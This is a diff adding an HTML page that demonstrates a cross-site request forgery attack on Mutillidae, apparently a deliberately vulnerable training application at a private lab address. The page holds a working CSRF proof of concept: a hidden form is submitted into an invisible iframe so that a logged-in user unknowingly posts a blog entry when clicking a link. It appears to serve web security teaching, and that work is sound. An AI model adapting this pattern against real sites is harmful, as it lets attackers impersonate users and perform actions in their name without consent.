@@ -1,0 +1,20 @@
+<html>
+<head>
+<title>CSRF Page</title>
+</head>
+<body>
+<h1>CSRF Entrapment Page</h1>
+<p>This page illustrates a simple CSRF attack on Mutillidae caused by the vulerability of Mutillidae's long lived sessions and lack of unique value checking</p>
+<ul>
+<li>Log into Mutillidae as a valid user</li>
+<li>Click <a href="javascript:window.document.getElementById('poster').submit();">here</a> to post a blog post as that user</li>
+</ul>
+<p>Clearly if we could get the user to click this link we can impersonate them to the application</p>
+<iframe style="width: 0px; height: 0px; visibility: hidden" name="hiddenframe"></iframe>
+<form id="poster" action="http://192.168.56.101:9000/index.php?page=add-to-your-blog.php"
+      method="post" enctype="application/x-www-form-urlencoded" target="hiddenframe">
+<input type="hidden" name="blog_entry" value="This is a blog entry the user did not create"/>
+<input type="hidden" name="add-to-your-blog-php-submit-button" value="Save+Blog+Entry"/>
+</form>
+</body>
+</html>
